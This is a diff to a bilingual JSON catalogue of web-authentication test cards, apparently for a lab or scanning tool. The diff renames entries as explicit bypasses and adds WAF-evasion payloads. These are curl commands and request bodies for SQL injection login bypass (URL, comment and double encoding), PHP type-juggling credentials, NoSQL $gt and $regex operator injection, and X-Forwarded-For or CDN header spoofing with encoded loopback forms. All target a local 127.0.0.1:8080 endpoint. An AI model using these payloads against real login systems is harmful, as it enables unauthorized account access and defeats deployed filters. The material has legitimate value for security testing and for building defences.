@@ -43,8 +43,8 @@
         {
           "id": "auth-sql-login-bypass",
           "name": {
-            "zh": "SQL 登录查询边界",
-            "en": "SQL Login Query Boundary"
+            "zh": "登录 SQL 注入绕过",
+            "en": "SQL Injection Login Bypass"
           },
           "description": {
             "zh": "对登录表单提交引号、恒真条件与注释闭合变体，以差异响应或成功登录判定凭据是否被拼接进 SQL。",
@@ -76,7 +76,180 @@
               "requiresAdmin": false
             }
           ],
-          "wafBypass": [],
+          "wafBypass": [
+            {
+              "title": {
+                "zh": "全量 URL 编码变形",
+                "en": "Full URL-Encoding Variant"
+              },
+              "command": "curl -sS --max-time 5 -d \"username=%61%64%6D%69%6E%27%20OR%20%27%31%27%3D%27%31%27--%20-\" http://127.0.0.1:8080/login",
+              "description": {
+                "zh": "绕过匹配明文 admin'/OR/'1'='1 特征的 WAF：将注入载荷全量百分号编码，传输层还原后进入 SQL 查询。成功判据：返回登录成功或与管理员登录一致的响应特征。",
+                "en": "Bypasses WAFs matching plaintext admin'/OR signatures by fully percent-encoding the payload. Success: response matches a successful admin login."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "curl -sS --max-time 5",
+                  "explanation": {
+                    "zh": "静默限时请求",
+                    "en": "Silent timed request"
+                  },
+                  "type": "function"
+                },
+                {
+                  "part": "username=%61%64%6D%69%6E%27%20OR%20%27%31%27%3D%27%31%27--%20-",
+                  "explanation": {
+                    "zh": "全量百分号编码载荷",
+                    "en": "Fully percent-encoded payload"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "http://127.0.0.1:8080/login",
+                  "explanation": {
+                    "zh": "登录端点",
+                    "en": "Login endpoint"
+                  },
+                  "type": "url"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "内联注释混淆",
+                "en": "Inline-Comment Obfuscation"
+              },
+              "command": "curl -sS --max-time 5 -d \"username=ad/**/min'/**/oR/**/'1'='1'/**/--/**/-\" http://127.0.0.1:8080/login",
+              "description": {
+                "zh": "绕过按整词匹配 OR/-- 的规则：用 MySQL 内联注释 /**/ 打散关键字，语义等价。成功判据：登录成功或 SQL 错误特征消失。",
+                "en": "Bypasses whole-word OR/-- rules by breaking keywords with /**/ inline comments. Success: login succeeds or SQL error signature disappears."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "ad/**/min",
+                  "explanation": {
+                    "zh": "注释拆散关键词",
+                    "en": "Comment splits the keyword"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "/**/oR/**/",
+                  "explanation": {
+                    "zh": "注释拆散 OR",
+                    "en": "Comment splits OR"
+                  },
+                  "type": "operator"
+                },
+                {
+                  "part": "--/**/-",
+                  "explanation": {
+                    "zh": "尾部注释",
+                    "en": "Trailing comment"
+                  },
+                  "type": "operator"
+                },
+                {
+                  "part": "http://127.0.0.1:8080/login",
+                  "explanation": {
+                    "zh": "登录端点",
+                    "en": "Login endpoint"
+                  },
+                  "type": "url"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "等价运算符与制表符",
+                "en": "Equivalent Operator & Tab Separator"
+              },
+              "command": "curl -sS --max-time 5 -d \"username=AdMiN'%09oR%09%31%09LiKe%09%27%31%27--%20-\" http://127.0.0.1:8080/login",
+              "description": {
+                "zh": "绕过大小写敏感与空格特征规则：用 %09 制表符替代空格、LiKe 等价 =、数字免引号。成功判据：登录成功响应。",
+                "en": "Bypasses case- and space-sensitive rules using %09 tabs, mixed case, and LiKe as = equivalent. Success: successful login response."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "AdMiN'",
+                  "explanation": {
+                    "zh": "大小写混合用户名",
+                    "en": "Mixed-case username"
+                  },
+                  "type": "value"
+                },
+                {
+                  "part": "%09",
+                  "explanation": {
+                    "zh": "制表符替代空格",
+                    "en": "Tab replaces a space"
+                  },
+                  "type": "operator"
+                },
+                {
+                  "part": "LiKe",
+                  "explanation": {
+                    "zh": "大小写混合 LIKE",
+                    "en": "Mixed-case LIKE"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "%31",
+                  "explanation": {
+                    "zh": "数字编码 1",
+                    "en": "Encoded digit one"
+                  },
+                  "type": "value"
+                },
+                {
+                  "part": "--%20-",
+                  "explanation": {
+                    "zh": "编码注释符",
+                    "en": "Encoded trailing comment"
+                  },
+                  "type": "operator"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "双重编码穿透",
+                "en": "Double-Encoding Pass-Through"
+              },
+              "command": "curl -sS --max-time 5 --path-as-is -d \"username=%2561dmin%2527%2520OR%2520%27%31%27%253D%27%31%27--%2520-\" http://127.0.0.1:8080/login",
+              "description": {
+                "zh": "绕过一次解码后校验的 WAF/中间件链：双重百分号编码，第二次解码发生在应用层。成功判据：登录成功。",
+                "en": "Bypasses WAF/middleware chains that validate after a single decode by double percent-encoding; the second decode happens at the app layer. Success: login succeeds."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "--path-as-is",
+                  "explanation": {
+                    "zh": "禁止路径规范化",
+                    "en": "Disables path normalization"
+                  },
+                  "type": "flag"
+                },
+                {
+                  "part": "%2561dmin%2527",
+                  "explanation": {
+                    "zh": "双重编码载荷",
+                    "en": "Double-encoded payload"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "%2520",
+                  "explanation": {
+                    "zh": "双重编码空格",
+                    "en": "Double-encoded space"
+                  },
+                  "type": "operator"
+                }
+              ]
+            }
+          ],
           "attackChain": [
             {
               "title": {
@@ -127,8 +300,8 @@
         {
           "id": "auth-php-credential-type-confusion",
           "name": {
-            "zh": "PHP 凭证类型混淆",
-            "en": "PHP Credential Type Confusion"
+            "zh": "认证弱类型比较绕过",
+            "en": "Type Juggling Auth Bypass"
           },
           "description": {
             "zh": "把用户名/密码提交为数组、true 或 0 形态，利用 PHP 松散比较绕过凭据校验。",
@@ -175,7 +348,237 @@
               "requiresAdmin": false
             }
           ],
-          "wafBypass": [],
+          "wafBypass": [
+            {
+              "title": {
+                "zh": "JSON 数组形态提交",
+                "en": "JSON Array Submission"
+              },
+              "command": "curl -sS --max-time 5 -H \"Content-Type: application/json\" -d '{\"user\":[\"PAYLOADER_MARKER\"],\"pass\":[\"PAYLOADER_MARKER\"]}' http://127.0.0.1:8080/login",
+              "description": {
+                "zh": "绕过仅检查表单键值对的 WAF 规则：改为 JSON 体提交并保持数组类型混淆。成功判据：非字符串凭据被接受或类型错误处理差异暴露。",
+                "en": "Bypasses WAF rules that only inspect form pairs by switching to a JSON body while keeping array type confusion. Success: non-string credentials accepted or type-error divergence exposed."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "-H \"Content-Type: application/json\"",
+                  "explanation": {
+                    "zh": "JSON 请求体类型",
+                    "en": "JSON body content type"
+                  },
+                  "type": "header"
+                },
+                {
+                  "part": "[\"PAYLOADER_MARKER\"]",
+                  "explanation": {
+                    "zh": "JSON 数组凭据",
+                    "en": "Array-typed credentials"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "http://127.0.0.1:8080/login",
+                  "explanation": {
+                    "zh": "登录端点",
+                    "en": "Login endpoint"
+                  },
+                  "type": "url"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "编码中括号变形",
+                "en": "Encoded Bracket Variant"
+              },
+              "command": "curl -sS --max-time 5 -d \"user%5B%5D=PAYLOADER_MARKER&pass%5B%5D=PAYLOADER_MARKER\" http://127.0.0.1:8080/login",
+              "description": {
+                "zh": "绕过匹配字面 pass[]= 的特征规则：百分号编码中括号，服务端仍解析为数组。成功判据：数组凭据触达 PHP 弱比较逻辑。",
+                "en": "Bypasses literal pass[]= signature matching by percent-encoding the brackets; the backend still parses them as arrays. Success: array credentials reach the weak comparison."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "user%5B%5D=PAYLOADER_MARKER",
+                  "explanation": {
+                    "zh": "编码中括号用户名",
+                    "en": "Encoded bracket username"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "pass%5B%5D=PAYLOADER_MARKER",
+                  "explanation": {
+                    "zh": "编码数组口令",
+                    "en": "Encoded array password"
+                  },
+                  "type": "payload"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "multipart 表单变换",
+                "en": "Multipart Form Transform"
+              },
+              "command": "curl -sS --max-time 5 -F \"user[]=PAYLOADER_MARKER\" -F \"pass[]=PAYLOADER_MARKER\" http://127.0.0.1:8080/login",
+              "description": {
+                "zh": "绕过按 application/x-www-form-urlencoded 解析体检查的 WAF：改用 multipart 编码携带数组参数。成功判据：类型混淆仍生效。",
+                "en": "Bypasses WAFs inspecting only urlencoded bodies by switching to multipart while carrying array parameters. Success: type confusion still triggers."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "-F \"user[]=PAYLOADER_MARKER\"",
+                  "explanation": {
+                    "zh": "multipart 数组名",
+                    "en": "Multipart array username"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "-F \"pass[]=PAYLOADER_MARKER\"",
+                  "explanation": {
+                    "zh": "multipart 数组口令",
+                    "en": "Multipart array password"
+                  },
+                  "type": "payload"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "布尔-数字交替",
+                "en": "Boolean-Number Alternation"
+              },
+              "command": "{\"username\":\"admin\",\"password\":1}\n{\"username\":\"admin\",\"password\":\"1\"}\n{\"username\":\"admin\",\"password\":true}",
+              "description": {
+                "zh": "数字与布尔交替探测松散比较窗口（PHP == 语义）。成功判据：任一非口令值通过比较。",
+                "en": "Alternating numeric and boolean forms probes loose-comparison windows (PHP == semantics). Success: any non-password value passes comparison."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "{\"username\":\"admin\",\"password\":1}",
+                  "explanation": {
+                    "zh": "数字一类型",
+                    "en": "Numeric one"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "{\"username\":\"admin\",\"password\":\"1\"}",
+                  "explanation": {
+                    "zh": "字符串一对照",
+                    "en": "String-one control"
+                  },
+                  "type": "value"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "空数组嵌套比较",
+                "en": "Empty-Array Nested Comparison"
+              },
+              "command": "{\"username\":\"admin\",\"password\":[]}\n{\"username\":\"admin\",\"password\":[[]]}\n{\"username\":\"admin\",\"password\":{}}",
+              "description": {
+                "zh": "空数组/空对象在 PHP 8 前后比较行为不同，定位版本相关弱点。成功判据：[] 与 [[]] 任一通过认证。",
+                "en": "Empty arrays/objects compare differently before and after PHP 8, locating version-dependent weakness. Success: either [] or [[]] authenticates."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "{\"username\":\"admin\",\"password\":[[]]}",
+                  "explanation": {
+                    "zh": "嵌套空数组",
+                    "en": "Nested empty array"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "{\"username\":\"admin\",\"password\":{}}",
+                  "explanation": {
+                    "zh": "空对象口令",
+                    "en": "Empty-object password"
+                  },
+                  "type": "payload"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "科学计数法魔数",
+                "en": "Scientific-Notation Magic Number"
+              },
+              "command": "{\"username\":\"admin\",\"password\":\"0e123456789\"}\n{\"username\":\"admin\",\"password\":\"0e0\"}",
+              "description": {
+                "zh": "0e 形态哈希松散比较等于 0，绕过口令校验。成功判据：0e 值通过比较。",
+                "en": "0e-style hashes loosely compare equal to 0, bypassing password checks. Success: the 0e value passes comparison."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "{\"username\":\"admin\",\"password\":\"0e123456789\"}",
+                  "explanation": {
+                    "zh": "0e 科学计数串",
+                    "en": "0e numeric string"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "{\"username\":\"admin\",\"password\":\"0e0\"}",
+                  "explanation": {
+                    "zh": "0e0 魔术串",
+                    "en": "0e0 magic string"
+                  },
+                  "type": "payload"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "Type Juggling",
+                "en": "Type Juggling"
+              },
+              "command": "{\"username\":\"admin\",\"password\":true}\n{\"username\":\"admin\",\"password\":0}\n{\"username\":\"admin\",\"password\":[]}\n{\"username\":\"admin\",\"password\":\"\"}\n{\"password\":\"\"} (array bypass for strcmp)",
+              "description": {
+                "zh": "把类型混淆凭据逐条提交登录端点；宽松比较导致认证通过，即确认弱类型凭据比较漏洞。",
+                "en": "Submit each type-confused credential to the login endpoint; authentication passing under loose comparison confirms the weak-typing flaw."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "{\"username\":\"admin\",\"password\":true}",
+                  "explanation": {
+                    "zh": "布尔类型口令",
+                    "en": "Boolean-typed password"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "{\"username\":\"admin\",\"password\":0}",
+                  "explanation": {
+                    "zh": "零值口令",
+                    "en": "Zero-typed password"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "{\"username\":\"admin\",\"password\":[]}",
+                  "explanation": {
+                    "zh": "空数组口令",
+                    "en": "Empty-array password"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "{\"password\":\"\"} (array bypass for strcmp)",
+                  "explanation": {
+                    "zh": "strcmp 数组绕过",
+                    "en": "strcmp array bypass"
+                  },
+                  "type": "payload"
+                }
+              ],
+              "platform": "all",
+              "requiresAdmin": false
+            }
+          ],
           "attackChain": [
             {
               "title": {
@@ -196,10 +599,7 @@
                 "zh": "只执行当前验证卡的第一条样例，并保持账户、会话和目标对象不变。",
                 "en": "Run only the first sample in this validation card while keeping the account, session, and target object unchanged."
               },
-              "payloadRef": {
-                "area": "execution",
-                "index": 0
-              }
+              "payload": "user[]=PAYLOADER_MARKER&pass[]=PAYLOADER_MARKER"
             },
             {
               "title": {
@@ -226,8 +626,8 @@
         {
           "id": "auth-nosql-credential-operator",
           "name": {
-            "zh": "NoSQL 凭证操作符边界",
-            "en": "NoSQL Credential Operator Boundary"
+            "zh": "NoSQL 登录注入绕过",
+            "en": "NoSQL Operator Injection Auth Bypass"
           },
           "description": {
             "zh": "把登录字段替换为 {$ne:''} 等对象操作符，验证 MongoDB 查询是否接受客户端构造的匹配条件。",
@@ -259,7 +659,111 @@
               "requiresAdmin": false
             }
           ],
-          "wafBypass": [],
+          "wafBypass": [
+            {
+              "title": {
+                "zh": "等价操作符替换",
+                "en": "Equivalent Operator Swap"
+              },
+              "command": "curl -sS --max-time 5 -H \"Content-Type: application/json\" -d '{\"user\":\"PAYLOADER_MARKER\",\"pass\":{\"$gt\":\"\"}}' http://127.0.0.1:8080/login",
+              "description": {
+                "zh": "绕过仅拉黑 $ne 的过滤器：用 $gt 空串实现同一\"任意非空口令\"语义。成功判据：登录成功。",
+                "en": "Bypasses filters that only blacklist $ne by using $gt with an empty string for the same any-password semantics. Success: login succeeds."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "{\"$gt\":\"\"}",
+                  "explanation": {
+                    "zh": "大于空串操作符",
+                    "en": "Greater-than-empty operator"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "-H \"Content-Type: application/json\"",
+                  "explanation": {
+                    "zh": "JSON 请求体类型",
+                    "en": "JSON body content type"
+                  },
+                  "type": "header"
+                },
+                {
+                  "part": "http://127.0.0.1:8080/login",
+                  "explanation": {
+                    "zh": "登录端点",
+                    "en": "Login endpoint"
+                  },
+                  "type": "url"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "$regex 模糊匹配",
+                "en": "$regex Fuzzy Match"
+              },
+              "command": "curl -sS --max-time 5 -H \"Content-Type: application/json\" -d '{\"user\":\"admin\",\"pass\":{\"$regex\":\"^.\"}}' http://127.0.0.1:8080/login",
+              "description": {
+                "zh": "绕过操作符黑名单：$regex 一步匹配任意首字符口令。成功判据：返回认证通过。",
+                "en": "Bypasses operator blacklists with $regex matching any first character of the password. Success: authentication passes."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "\"user\":\"admin\"",
+                  "explanation": {
+                    "zh": "目标管理员账号",
+                    "en": "Target admin account"
+                  },
+                  "type": "value"
+                },
+                {
+                  "part": "{\"$regex\":\"^.\"}",
+                  "explanation": {
+                    "zh": "正则任意匹配",
+                    "en": "Regex matches any value"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "http://127.0.0.1:8080/login",
+                  "explanation": {
+                    "zh": "登录端点",
+                    "en": "Login endpoint"
+                  },
+                  "type": "url"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "表单括号语法",
+                "en": "Form Bracket Syntax"
+              },
+              "command": "curl -sS --max-time 5 -d \"user=admin&pass[$regex]=^.\" http://127.0.0.1:8080/login",
+              "description": {
+                "zh": "绕过仅检查 JSON 体的 WAF：用 qs 括号语法在表单编码里构造操作符对象。成功判据：登录成功。",
+                "en": "Bypasses JSON-only body inspection by building the operator object via qs bracket syntax in a form body. Success: login succeeds."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "user=admin",
+                  "explanation": {
+                    "zh": "表单编码用户名",
+                    "en": "Form-encoded username"
+                  },
+                  "type": "value"
+                },
+                {
+                  "part": "pass[$regex]=^.",
+                  "explanation": {
+                    "zh": "表单编码操作符",
+                    "en": "Form-encoded operator"
+                  },
+                  "type": "payload"
+                }
+              ]
+            }
+          ],
           "attackChain": [
             {
               "title": {
@@ -310,8 +814,8 @@
         {
           "id": "auth-trusted-proxy-header",
           "name": {
-            "zh": "可信代理头认证边界",
-            "en": "Trusted Proxy Header Authentication Boundary"
+            "zh": "伪造客户端 IP 头认证绕过",
+            "en": "Client IP Header Spoofing"
           },
           "description": {
             "zh": "伪造 X-Forwarded-For 等代理头，验证应用是否以可伪造的请求头做身份或内网信任判定。",
@@ -343,7 +847,277 @@
               "requiresAdmin": false
             }
           ],
-          "wafBypass": [],
+          "wafBypass": [
+            {
+              "title": {
+                "zh": "大小写与重复头叠加",
+                "en": "Case & Duplicate Header Stacking"
+              },
+              "command": "printf 'GET /marker HTTP/1.1\\r\\nHost: 127.0.0.1:8080\\r\\nX-Forwarded-For: 127.0.0.1\\r\\nx-forwarded-for: 127.0.0.1\\r\\nConnection: close\\r\\n\\r\\n' | nc 127.0.0.1 8080",
+              "description": {
+                "zh": "绕过头名精确匹配的清洗规则：大小写变体与重复头叠加，不同中间件取值不同。成功判据：受保护资源返回 200。",
+                "en": "Bypasses exact header-name sanitization by stacking case variants and duplicate headers; different middlewares pick different ones. Success: protected resource returns 200."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "GET /marker HTTP/1.1",
+                  "explanation": {
+                    "zh": "手工 GET 请求行",
+                    "en": "Handcrafted GET request line"
+                  },
+                  "type": "control"
+                },
+                {
+                  "part": "X-Forwarded-For: 127.0.0.1",
+                  "explanation": {
+                    "zh": "标准大小写头",
+                    "en": "Normal-case header"
+                  },
+                  "type": "header"
+                },
+                {
+                  "part": "x-forwarded-for: 127.0.0.1",
+                  "explanation": {
+                    "zh": "小写重复头",
+                    "en": "Lowercase duplicate header"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "| nc 127.0.0.1 8080",
+                  "explanation": {
+                    "zh": "nc 直连发送",
+                    "en": "Sends raw bytes via nc"
+                  },
+                  "type": "operator"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "替代头族轮换",
+                "en": "Alternate Header Family Rotation"
+              },
+              "command": "curl -sS --max-time 5 -H \"X-Real-IP: 127.0.0.1\" -H \"True-Client-IP: 127.0.0.1\" http://127.0.0.1:8080/marker",
+              "description": {
+                "zh": "绕过只清洗 X-Forwarded-For 的防护：改用 X-Real-IP/True-Client-IP 等同义头命中白名单逻辑。成功判据：授权通过。",
+                "en": "Bypasses defenses that sanitize only X-Forwarded-For by switching to synonymous headers like X-Real-IP/True-Client-IP. Success: authorization passes."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "-H \"X-Real-IP: 127.0.0.1\"",
+                  "explanation": {
+                    "zh": "真实 IP 头",
+                    "en": "X-Real-IP header"
+                  },
+                  "type": "header"
+                },
+                {
+                  "part": "-H \"True-Client-IP: 127.0.0.1\"",
+                  "explanation": {
+                    "zh": "CDN 客户端头",
+                    "en": "CDN client IP header"
+                  },
+                  "type": "header"
+                },
+                {
+                  "part": "http://127.0.0.1:8080/marker",
+                  "explanation": {
+                    "zh": "受保护标记路径",
+                    "en": "Protected marker path"
+                  },
+                  "type": "url"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "链式 XFF 伪造",
+                "en": "Chained XFF Forgery"
+              },
+              "command": "curl -sS --max-time 5 -H \"X-Forwarded-For: 8.8.8.8, 127.0.0.1\" http://127.0.0.1:8080/marker",
+              "description": {
+                "zh": "绕过取首段 IP 的校验逻辑：伪造多级代理链使末段为可信地址。成功判据：以可信身份访问成功。",
+                "en": "Bypasses first-IP extraction by forging a multi-hop chain whose last entry is the trusted address. Success: access granted as trusted client."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "-H \"X-Forwarded-For: 8.8.8.8, 127.0.0.1\"",
+                  "explanation": {
+                    "zh": "多级代理链头",
+                    "en": "Multi-hop proxy chain"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "127.0.0.1",
+                  "explanation": {
+                    "zh": "末段可信地址",
+                    "en": "Trusted last hop"
+                  },
+                  "type": "value"
+                },
+                {
+                  "part": "http://127.0.0.1:8080/marker",
+                  "explanation": {
+                    "zh": "受保护标记路径",
+                    "en": "Protected marker path"
+                  },
+                  "type": "url"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "头族轮换伪造",
+                "en": "Header Family Rotation"
+              },
+              "command": "X-Client-IP: 127.0.0.1\nTrue-Client-IP: 127.0.0.1\nCF-Connecting-IP: 127.0.0.1\nFastly-Client-IP: 127.0.0.1",
+              "description": {
+                "zh": "轮换 CDN/代理专有头命中未被清洗的取值字段。成功判据：任一头使访问控制放行。",
+                "en": "Rotating CDN/proxy-specific headers hits unsanitized extraction fields. Success: any header unlocks access control."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "X-Client-IP: 127.0.0.1",
+                  "explanation": {
+                    "zh": "客户端 IP 头",
+                    "en": "X-Client-IP header"
+                  },
+                  "type": "header"
+                },
+                {
+                  "part": "CF-Connecting-IP: 127.0.0.1",
+                  "explanation": {
+                    "zh": "Cloudflare 连接头",
+                    "en": "Cloudflare header"
+                  },
+                  "type": "header"
+                },
+                {
+                  "part": "Fastly-Client-IP: 127.0.0.1",
+                  "explanation": {
+                    "zh": "Fastly 客户端头",
+                    "en": "Fastly header"
+                  },
+                  "type": "header"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "多值链伪造",
+                "en": "Multi-Value Chain Forgery"
+              },
+              "command": "X-Forwarded-For: 1.1.1.1, 10.0.0.1\nX-Forwarded-For: 8.8.8.8,127.0.0.1,10.0.0.1",
+              "description": {
+                "zh": "多级链形态使信任段（末位/首段）落入内网地址。成功判据：以内网身份通过。",
+                "en": "Multi-hop chains place the trusted segment (first or last) on an internal address. Success: passes as an internal client."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "X-Forwarded-For: 1.1.1.1, 10.0.0.1",
+                  "explanation": {
+                    "zh": "公网加内网链",
+                    "en": "Public plus internal chain"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "X-Forwarded-For: 8.8.8.8,127.0.0.1,10.0.0.1",
+                  "explanation": {
+                    "zh": "三段混合链",
+                    "en": "Three-hop mixed chain"
+                  },
+                  "type": "payload"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "下划线头变体",
+                "en": "Underscore Header Variant"
+              },
+              "command": "X_Forwarded_For: 127.0.0.1\nX_Forwarded_Host: localhost",
+              "description": {
+                "zh": "下划线变体经 nginx 等 underscore 处理差异进入取值。成功判据：变体头被采信。",
+                "en": "Underscore variants slip in via nginx-style underscore handling. Success: the variant header is honored."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "X_Forwarded_For: 127.0.0.1",
+                  "explanation": {
+                    "zh": "下划线头名变体",
+                    "en": "Underscore header variant"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "X_Forwarded_Host: localhost",
+                  "explanation": {
+                    "zh": "下划线主机头",
+                    "en": "Underscore host header"
+                  },
+                  "type": "payload"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "请求头伪造",
+                "en": "Validation step 1 for Proxy Client-IP Header Trust Bypass"
+              },
+              "command": "X-Forwarded-For: 127.0.0.1\nX-Forwarded-For: localhost\nX-Forwarded-For: 10.0.0.1\nX-Forwarded-For: 172.16.0.1\nX-Forwarded-For: 192.168.1.1\nX-Forwarded-For: ::1\nX-Forwarded-For: 0:0:0:0:0:0:0:1\nX-Forwarded-For: 0x7f000001\nX-Forwarded-For: 2130706433\nX-Forwarded-For: 0177.0.0.1\nX-Forwarded-For: 127.0.0.1, 10.0.0.1\nX-Forwarded-For: 10.0.0.1, 127.0.0.1\nX-Forwarded-For: 127.0.0.1, 127.0.0.1\nX-Forwarded-For: unknown, 127.0.0.1\nX-Forwarded-For: 127.0.0.1, unknown\nX-Forwarded-For: 127.0.0.1, 127.0.0.1, 127.0.0.1\nX-Forwarded-For: 127.0.0.1:80\nX-Forwarded-For: 127.0.0.1:443\nX-Forwarded-For: 127.0.0.1:8080\nX-Forwarded-For: 127.0.0.1:8443\nX-Forwarded-For: 127.0.0.1:8888\nX-Forwarded-For: 127.0.0.1:3000\nX-Forwarded-For: 127.0.0.1:5000\nX-Forwarded-For: 127.0.0.1:9000\nX-Forwarded-For: 127.0.0.1:9090\nX-Forwarded-For: 127.0.0.1:3306\nX-Forwarded-For: 127.0.0.1:6379\nX-Forwarded-For: 127.0.0.1:27017\nX-Forwarded-For: 127.0.0.1:9200\nX-Forwarded-For: 127.0.0.1:11211\nX-Forwarded-For: 127.0.0.1:5432\nX-Forwarded-For: 127.0.0.1:1521\nX-Forwarded-For: 127.0.0.1:1433\nX-Forwarded-For: 127.0.0.1:8983\nX-Forwarded-For: 127.0.0.1:50070\nX-Forwarded-For: 127.0.0.1:2375\nX-Forwarded-For: 127.0.0.1:2376\nX-Forwarded-For: 127.0.0.1:8500\nX-Forwarded-For: 127.0.0.1:15672\nX-Forwarded-For: 127.0.0.1:5672\nX-Forwarded-For: 127.0.0.1:8161\nX-Forwarded-For: 127.0.0.1:6443\nX-Forwarded-For: 127.0.0.1:10250\nX-Forwarded-For: 127.0.0.1:10255\nX-Forwarded-For: 127.0.0.1:2379\nX-Forwarded-For: 127.0.0.1:2380\nX-Forwarded-For: 127.0.0.1:7001\nX-Real-IP: 127.0.0.1\nX-Real-IP: localhost\nX-Real-IP: 10.0.0.1",
+              "description": {
+                "zh": "把转发 IP 头变体逐条注入；基于客户端 IP 的访问控制放行请求，即确认转发头信任可伪造。",
+                "en": "Inject each forwarded-IP header variant; client-IP-based access control allowing the request confirms forgeable forwarded-header trust."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "X-Forwarded-For: 127.0.0.1",
+                  "explanation": {
+                    "zh": "环回 XFF 头",
+                    "en": "Loopback XFF header"
+                  },
+                  "type": "header"
+                },
+                {
+                  "part": "X-Forwarded-For: 0x7f000001",
+                  "explanation": {
+                    "zh": "十六进制 IP 形态",
+                    "en": "Hex IP form"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "X-Forwarded-For: 2130706433",
+                  "explanation": {
+                    "zh": "十进制 IP 形态",
+                    "en": "Decimal IP form"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "X-Forwarded-For: 127.0.0.1, 10.0.0.1",
+                  "explanation": {
+                    "zh": "多级代理链形态",
+                    "en": "Multi-hop chain"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "X-Real-IP: 127.0.0.1",
+                  "explanation": {
+                    "zh": "真实 IP 头",
+                    "en": "X-Real-IP header"
+                  },
+                  "type": "header"
+                }
+              ],
+              "platform": "all",
+              "requiresAdmin": false
+            }
+          ],
           "attackChain": [
             {
               "title": {
@@ -364,10 +1138,7 @@
                 "zh": "只执行当前验证卡的第一条样例，并保持账户、会话和目标对象不变。",
                 "en": "Run only the first sample in this validation card while keeping the account, session, and target object unchanged."
               },
-              "payloadRef": {
-                "area": "execution",
-                "index": 0
-              }
+              "payload": "X-Forwarded-For: {LAB_HOST}\nX-Original-URL: /marker"
             },
             {
               "title": {
@@ -394,8 +1165,8 @@
         {
           "id": "auth-method-path-normalization",
           "name": {
-            "zh": "方法与路径规范化授权边界",
-            "en": "Method and Path Normalization Authorization Boundary"
+            "zh": "HTTP 方法与路径规范化授权绕过",
+            "en": "Method & Path Normalization Authz Bypass"
           },
           "description": {
             "zh": "用大小写、尾斜杠与编码变体访问同一受保护路径并切换 HTTP 方法，验证代理与应用的授权判定是否一致。",
@@ -441,7 +1212,119 @@
               "requiresAdmin": false
             }
           ],
-          "wafBypass": [],
+          "wafBypass": [
+            {
+              "title": {
+                "zh": "路径编码变形",
+                "en": "Encoded Path Variant"
+              },
+              "command": "curl -sS --max-time 5 --path-as-is http://127.0.0.1:8080/%6Darker",
+              "description": {
+                "zh": "绕过路径字面匹配的访问控制：百分号编码首字母，代理透传后由后端规范化命中路由。成功判据：200 响应且返回 marker 内容。",
+                "en": "Bypasses literal path matching by percent-encoding a letter; the proxy passes it through and the backend normalizes it to the route. Success: 200 with marker content."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "--path-as-is",
+                  "explanation": {
+                    "zh": "禁止路径规范化",
+                    "en": "Disables path normalization"
+                  },
+                  "type": "flag"
+                },
+                {
+                  "part": "%6Darker",
+                  "explanation": {
+                    "zh": "编码首字母 m",
+                    "en": "Encoded first letter m"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "http://127.0.0.1:8080/%6Darker",
+                  "explanation": {
+                    "zh": "编码路径目标",
+                    "en": "Encoded path target"
+                  },
+                  "type": "url"
+                }
+              ]
+            },
